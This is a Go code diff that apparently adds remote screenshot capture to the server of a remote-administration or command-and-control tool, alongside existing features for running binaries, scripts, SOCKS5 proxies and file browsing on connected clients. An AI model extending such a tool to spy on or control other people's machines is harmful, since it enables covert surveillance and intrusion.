@@ -534,6 +534,11 @@ func ExitClient(c *gin.Context) {
 			}
 		}
 		database.Engine.Where("uid = ?", clientBody.Uid).Delete(new(database.Socks5))
+		database.Engine.Where("uid = ?", clientBody.Uid).Delete(new(database.Screenshots))
+		screenshotDir := filepath.Join("Screenshots", clientBody.Uid)
+		if _, err := os.Stat(screenshotDir); err == nil {
+			os.RemoveAll(screenshotDir)
+		}
 		delete(command.UidFileBrowser, clientBody.Uid)
 	}()
 
@@ -644,6 +649,69 @@ func ExecuteBin(c *gin.Context) {
 		sendcommand.SendCommandBytes(uid, byteToSend)
 	}
 	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
+}
+
+func CaptureScreenshot(c *gin.Context) {
+	var req struct {
+		Uid string `json:"uid"`
+	}
+	if err := c.ShouldBindJSON(&req); err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
+		return
+	}
+	sendcommand.SendCommand(req.Uid, "screenshot")
+	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
+}
+
+type ScreenshotInfo struct {
+	Id        int64  `json:"id"`
+	Uid       string `json:"uid"`
+	FileName  string `json:"fileName"`
+	CreatedAt int64  `json:"createdAt"`
+}
+
+func ListScreenshots(c *gin.Context) {
+	var req struct {
+		Uid string `form:"uid"`
+	}
+	if err := c.ShouldBindQuery(&req); err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
+		return
+	}
+	var shots []database.Screenshots
+	database.Engine.Where("uid = ?", req.Uid).Desc("id").Find(&shots)
+	var result []ScreenshotInfo
+	for _, s := range shots {
+		result = append(result, ScreenshotInfo{
+			Id:        s.Id,
+			Uid:       s.Uid,
+			FileName:  s.FileName,
+			CreatedAt: s.CreatedAt,
+		})
+	}
+	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": result})
+}
+
+func GetScreenshotImage(c *gin.Context) {
+	var req struct {
+		Id int64 `form:"id"`
+	}
+	if err := c.ShouldBindQuery(&req); err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
+		return
+	}
+	var shot database.Screenshots
+	exists, err := database.Engine.Where("id = ?", req.Id).Get(&shot)
+	if err != nil || !exists {
+		c.JSON(http.StatusNotFound, gin.H{"error": "Screenshot not found"})
+		return
+	}
+	if _, err := os.Stat(shot.FilePath); os.IsNotExist(err) {
+		c.JSON(http.StatusNotFound, gin.H{"error": "File not found"})
+		return
+	}
+	c.Header("Content-Type", "image/png")
+	c.File(shot.FilePath)
 }
 
 func ExecuteLinuxScript(c *gin.Context) {
